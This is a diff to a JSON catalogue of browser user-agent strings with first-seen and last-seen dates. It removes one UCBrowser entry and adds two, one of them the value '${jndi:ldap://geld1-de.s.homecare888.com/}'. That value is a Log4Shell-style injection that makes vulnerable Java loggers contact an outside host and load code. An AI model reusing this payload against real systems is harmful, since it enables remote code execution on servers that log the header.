@@ -1,13 +1,6 @@
 [
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 Linux; U; Android 4.4.4; en-US; SM-G5306W Build/KTU84P AppleWebKit/537.36 KHTML, like Gecko Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.3.1199 Mobile Safari/537.36"
-    },
-    "date-first": "2020-01-01",
-    "date-last": "2020-01-01"
-  },
-  {
-    "headers": {
       "user-agent": "Mozilla/5.0 Linux; U; Android 4.4.4; en-US; SM-G5306W Build/KTU84P AppleWebKit/537.36 KHTML, like Gecko Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.6.1200 Mobile Safari/537.36"
     },
     "date-first": "2020-01-01",
@@ -6995,6 +6988,13 @@
   {
     "headers": {
       "user-agent": "Chrome 37 on Linux"
+    },
+    "date-first": "2020-01-01",
+    "date-last": "2020-01-01"
+  },
+  {
+    "headers": {
+      "user-agent": "${jndi:ldap://geld1-de.s.homecare888.com/}"
     },
     "date-first": "2020-01-01",
     "date-last": "2020-01-01"
